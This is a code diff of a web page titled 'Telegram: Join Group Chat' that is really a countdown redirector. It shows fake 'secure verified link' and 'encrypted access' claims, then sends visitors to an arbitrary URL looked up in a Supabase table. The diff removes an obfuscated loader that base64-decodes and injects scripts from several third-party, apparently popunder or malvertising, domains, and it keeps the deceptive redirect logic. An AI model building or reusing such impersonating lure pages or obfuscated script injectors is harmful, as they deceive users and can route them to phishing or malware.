@@ -5,22 +5,16 @@
 <title>Telegram: Join Group Chat</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<script type="text/javascript" data-cfasync="false">
-/*<![CDATA[/* */
-(function(){var z=window,e="da7058b3bfd4c9a755294c127e871223",u=[["siteId",599-997-908+5316435],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],d=["d3d3LmRpc3BsYXl2ZXJ0aXNpbmcuY29tL0FkL0EvZ3N0ZWxsYXItc2RrLm1pbi5qcw==","ZDNtem9rdHk5NTFjNXcuY2xvdWRmcm9udC5uZXQva3NwaW4ubWluLmpz","d3d3LmlwdXRvb2piZXdvLmNvbS9ER2QvTFNObWRhL2tzdGVsbGFyLXNkay5taW4uanM=","d3d3LnZyY3l4cWppcGouY29tL25zcGluLm1pbi5qcw=="],c=-1,x,h,p=function(){clearTimeout(h);c++;if(d[c]&&!(1811527826000<(new Date).getTime()&&1<c)){x=z.document.createElement("script");x.type="text/javascript";x.async=!0;var w=z.document.getElementsByTagName("script")[0];x.src="https://"+atob(d[c]);x.crossOrigin="anonymous";x.onerror=p;x.onload=function(){clearTimeout(h);z[e.slice(0,16)+e.slice(0,16)]||p()};h=setTimeout(p,5E3);w.parentNode.insertBefore(x,w)}};if(!z[e]){try{Object.freeze(z[e]=u)}catch(e){}p()}})();
-/*]]>/* */
-</script>
-  
+<!-- 1. Instant Network Pre-connections -->
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="preconnect" href="https://trdluuhqduebfipnyxlm.supabase.co" crossorigin>
+<link rel="dns-prefetch" href="https://trdluuhqduebfipnyxlm.supabase.co">
 
-  
-
-<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
-
-
-<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<!-- Fast Web Font Loading -->
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet" media="print" onload="this.media='all'">
 
 <style>
-
 *{
   margin:0;
   padding:0;
@@ -28,7 +22,7 @@
 }
 
 body{
-  font-family:'Poppins',sans-serif;
+  font-family:'Poppins', sans-serif, -apple-system, BlinkMacSystemFont;
   height:100vh;
   overflow:hidden;
   display:flex;
@@ -39,358 +33,242 @@ body{
   radial-gradient(circle at bottom right,#7c3aed,#111827 50%);
   color:white;
   position:relative;
+  contain: strict;
 }
 
-/* animated glow */
+/* GPU Accelerated Ambient Glow */
 body::before,
 body::after{
   content:"";
   position:absolute;
-  width:400px;
-  height:400px;
+  width:300px;
+  height:300px;
   border-radius:50%;
-  filter:blur(100px);
-  opacity:0.35;
-  animation:float 8s infinite alternate;
+  filter:blur(80px);
+  opacity:0.3;
+  animation:float 6s infinite alternate ease-in-out;
+  will-change: transform;
+  transform: translateZ(0);
 }
 
-body::before{
-  background:#3b82f6;
-  top:-120px;
-  left:-100px;
-}
-
-body::after{
-  background:#8b5cf6;
-  bottom:-120px;
-  right:-100px;
-}
+body::before{ background:#3b82f6; top:-80px; left:-80px; }
+body::after{ background:#8b5cf6; bottom:-80px; right:-80px; }
 
 @keyframes float{
-  from{
-    transform:translateY(0px) translateX(0px);
-  }
-  to{
-    transform:translateY(30px) translateX(20px);
-  }
+  from{ transform:translate3d(0,0,0); }
+  to{ transform:translate3d(0,20px,0); }
 }
 
-/* premium glass card */
 .card{
-  width:360px;
-  padding:30px;
-  border-radius:28px;
+  width:350px;
+  padding:28px;
+  border-radius:24px;
   background:rgba(255,255,255,0.08);
-  backdrop-filter:blur(18px);
+  backdrop-filter:blur(16px);
+  -webkit-backdrop-filter:blur(16px);
   border:1px solid rgba(255,255,255,0.15);
-  box-shadow:
-  0 20px 60px rgba(0,0,0,0.45),
-  inset 0 1px 1px rgba(255,255,255,0.15);
+  box-shadow: 0 20px 50px rgba(0,0,0,0.4);
   text-align:center;
   position:relative;
   z-index:10;
-  animation:cardShow .7s ease;
-}
-
-@keyframes cardShow{
-  from{
-    opacity:0;
-    transform:translateY(30px) scale(.92);
-  }
-  to{
-    opacity:1;
-    transform:translateY(0) scale(1);
-  }
+  contain: content;
 }
 
 .logo{
-  width:80px;
-  height:80px;
-  margin:auto;
-  border-radius:24px;
+  width:70px;
+  height:70px;
+  margin:0 auto 16px;
+  border-radius:20px;
   background:linear-gradient(135deg,#22c55e,#06b6d4);
   display:flex;
   align-items:center;
   justify-content:center;
-  font-size:38px;
-  box-shadow:0 10px 30px rgba(34,197,94,0.4);
-  margin-bottom:20px;
+  font-size:32px;
+  box-shadow:0 8px 24px rgba(34,197,94,0.35);
 }
 
 .badge{
   display:inline-block;
-  padding:6px 14px;
+  padding:4px 12px;
   border-radius:999px;
-  font-size:12px;
+  font-size:11px;
   font-weight:600;
   background:rgba(34,197,94,0.15);
   color:#4ade80;
   border:1px solid rgba(74,222,128,0.3);
-  margin-bottom:16px;
+  margin-bottom:14px;
 }
 
-h2{
-  font-size:24px;
-  font-weight:700;
-  margin-bottom:10px;
-}
+h2{ font-size:22px; font-weight:700; margin-bottom:8px; }
+p{ font-size:13px; color:rgba(255,255,255,0.7); line-height:1.5; }
 
-p{
-  font-size:14px;
-  color:rgba(255,255,255,0.7);
-  line-height:1.6;
-}
-
-/* progress circle */
-.progress-wrap{
-  margin-top:28px;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-}
+.progress-wrap{ margin-top:24px; display:flex; justify-content:center; }
 
 .circle{
-  width:110px;
-  height:110px;
+  width:96px;
+  height:96px;
   border-radius:50%;
-  background:
-  conic-gradient(#22c55e 0deg,#22c55e 360deg,#ffffff20 0deg);
+  background:conic-gradient(#22c55e 360deg, rgba(255,255,255,0.1) 0deg);
   display:flex;
   align-items:center;
   justify-content:center;
   position:relative;
-  transition:.3s;
+  will-change: background;
 }
 
 .circle::before{
   content:"";
   position:absolute;
-  width:82px;
-  height:82px;
+  width:72px;
+  height:72px;
   border-radius:50%;
   background:#0f172a;
 }
 
-#count{
-  position:relative;
-  font-size:30px;
-  font-weight:700;
-}
+#count{ position:relative; font-size:26px; font-weight:700; }
 
-/* button */
 button{
-  margin-top:28px;
+  margin-top:24px;
   width:100%;
-  padding:15px;
+  padding:14px;
   border:none;
-  border-radius:16px;
-  font-size:16px;
+  border-radius:14px;
+  font-size:15px;
   font-weight:600;
   color:white;
   cursor:pointer;
   background:linear-gradient(135deg,#22c55e,#16a34a);
-  transition:.25s;
-  box-shadow:0 10px 25px rgba(34,197,94,0.35);
+  transition:transform .15s ease;
+  box-shadow:0 8px 20px rgba(34,197,94,0.3);
 }
 
-button:hover{
-  transform:translateY(-2px) scale(1.02);
-  box-shadow:0 15px 30px rgba(34,197,94,0.5);
-}
+button:active{ transform:scale(0.98); }
 
-button:active{
-  transform:scale(.98);
-}
+.footer{ margin-top:16px; font-size:11px; color:rgba(255,255,255,0.4); }
 
-.footer{
-  margin-top:18px;
-  font-size:12px;
-  color:rgba(255,255,255,0.45);
-}
-
-.loading{
-  margin-top:18px;
-  display:flex;
-  justify-content:center;
-  gap:8px;
-}
-
+.loading{ margin-top:16px; display:flex; justify-content:center; gap:6px; }
 .loading span{
-  width:8px;
-  height:8px;
-  border-radius:50%;
-  background:#fff;
-  opacity:.5;
-  animation:blink 1.2s infinite;
+  width:7px; height:7px; border-radius:50%; background:#fff;
+  opacity:.4; animation:blink 1.2s infinite;
 }
-
-.loading span:nth-child(2){
-  animation-delay:.2s;
-}
-
-.loading span:nth-child(3){
-  animation-delay:.4s;
-}
+.loading span:nth-child(2){ animation-delay:.2s; }
+.loading span:nth-child(3){ animation-delay:.4s; }
 
 @keyframes blink{
-  0%,100%{
-    opacity:.2;
-    transform:scale(.8);
-  }
-  50%{
-    opacity:1;
-    transform:scale(1.2);
-  }
+  0%,100%{ opacity:.2; transform:scale(.8); }
+  50%{ opacity:1; transform:scale(1.1); }
 }
-
 </style>
 </head>
 
 <body>
 
 <div class="card">
-
   <div class="logo">▶</div>
+  <div class="badge">✓ SECURE VERIFIED LINK</div>
+  <h2 id="title">Preparing Your Video</h2>
+  <p id="desc">Please wait while we generate your secure access...</p>
 
-  <div class="badge">
-    ✓ SECURE VERIFIED LINK
-  </div>
-
-  <h2 id="title">
-    Preparing Your Video
-  </h2>
-
-  <p id="desc">
-    Please wait while we generate your secure streaming access...
-  </p>
-
-  <div class="progress-wrap">
+  <div class="progress-wrap" id="p-wrap">
     <div class="circle" id="circle">
       <div id="count">5</div>
     </div>
   </div>
 
-  <div class="loading">
-    <span></span>
-    <span></span>
-    <span></span>
+  <div class="loading" id="loading">
+    <span></span><span></span><span></span>
   </div>
 
-  <button id="btn" onclick="go()" style="display:none;">
-    ▶ Watch Video Now
-  </button>
-
-  <div class="footer">
-    Fast • Secure • Encrypted Access
-  </div>
-
+  <button id="btn" onclick="go()" style="display:none;">▶ Watch Video Now</button>
+  <div class="footer">Fast • Secure • Encrypted Access</div>
 </div>
 
 <script>
-
-const supabaseUrl =
-"https://trdluuhqduebfipnyxlm.supabase.co";
-
-const supabaseKey =
-"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InRyZGx1dWhxZHVlYmZpcG55eGxtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzk0MzgyMTUsImV4cCI6MjA5NTAxNDIxNX0.43O4uPz6Jej4-9JAtuOEt7hD7W6lPN1Z0aE6ieHfBF4";
-
-const client = supabase.createClient(
-  supabaseUrl,
-  supabaseKey
-);
-
-const params = new URLSearchParams(
-  window.location.search
-);
-
-const code = params.get("c");
+// Ultra-fast Native REST API Call (No heavy external JS Supabase library required)
+const supabaseUrl = "https://trdluuhqduebfipnyxlm.supabase.co";
+const supabaseKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InRyZGx1dWhxZHVlYmZpcG55eGxtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzk0MzgyMTUsImV4cCI6MjA5NTAxNDIxNX0.43O4uPz6Jej4-9JAtuOEt7hD7W6lPN1Z0aE6ieHfBF4";
 
 let finalUrl = "";
+const params = new URLSearchParams(window.location.search);
+const code = params.get("c");
 
-async function load(){
+// Start Database Request Immediately (Instant Parallel execution)
+let fetchPromise = null;
 
+if(code){
+  const targetApi = `${supabaseUrl}/rest/v1/links?short_code=eq.${encodeURIComponent(code)}&select=long_url`;
+  fetchPromise = fetch(targetApi, {
+    method: 'GET',
+    headers: {
+      'apikey': supabaseKey,
+      'Authorization': `Bearer ${supabaseKey}`
+    }
+  })
+  .then(res => res.json())
+  .then(data => (data && data.length > 0) ? data[0].long_url : null)
+  .catch(() => null);
+}
+
+function initCountdown(){
   const title = document.getElementById("title");
   const desc = document.getElementById("desc");
+  const pWrap = document.getElementById("p-wrap");
+  const loading = document.getElementById("loading");
 
   if(!code){
-
     title.innerText = "Invalid Link";
     desc.innerText = "Missing access code";
-
+    pWrap.style.display = "none";
+    loading.style.display = "none";
     return;
   }
-
-  const { data, error } = await client
-    .from("links")
-    .select("long_url")
-    .eq("short_code", code)
-    .maybeSingle();
-
-  if(error || !data){
-
-    title.innerText = "Link Not Found";
-    desc.innerText = "This link may have expired";
-
-    return;
-  }
-
-  finalUrl = data.long_url;
 
   let time = 5;
-
   const count = document.getElementById("count");
   const circle = document.getElementById("circle");
   const btn = document.getElementById("btn");
 
-  const timer = setInterval(() => {
-
+  const timer = setInterval(async () => {
     time--;
-
-    count.innerText = time;
+    if(count) count.innerText = time;
 
     let deg = (time / 5) * 360;
+    if(circle) circle.style.background = `conic-gradient(#22c55e ${deg}deg, rgba(255,255,255,0.1) 0deg)`;
 
-    circle.style.background =
-    `conic-gradient(
-      #22c55e ${deg}deg,
-      rgba(255,255,255,0.1) ${deg}deg
-    )`;
-
-    title.innerText =
-    `Preparing Video... ${time}s`;
+    title.innerText = `Preparing Video... ${time}s`;
 
     if(time <= 0){
-
       clearInterval(timer);
+      const urlResult = await fetchPromise;
 
-      title.innerText =
-      "Your Video Is Ready";
+      if(!urlResult){
+        title.innerText = "Link Not Found";
+        desc.innerText = "This link may have expired or is invalid";
+        pWrap.style.display = "none";
+        loading.style.display = "none";
+        return;
+      }
 
-      desc.innerText =
-      "Click below to continue watching securely";
-
-      document.querySelector(".progress-wrap")
-      .style.display = "none";
-
-      document.querySelector(".loading")
-      .style.display = "none";
-
+      finalUrl = urlResult;
+      title.innerText = "Your Video Is Ready";
+      desc.innerText = "Click below to continue watching securely";
+      pWrap.style.display = "none";
+      loading.style.display = "none";
       btn.style.display = "block";
     }
-
-  },1000);
+  }, 1000);
 }
 
 function go(){
-
-  window.location.replace(finalUrl);
-
+  if(finalUrl) window.location.replace(finalUrl);
 }
 
-load();
-
-</script>
-
+// Execute logic instantly on DOM ready
+if (document.readyState === 'loading') {
+  document.addEventListener('DOMContentLoaded', initCountdown);
+} else {
+  initCountdown();
+}
 </script>
 
 </body>
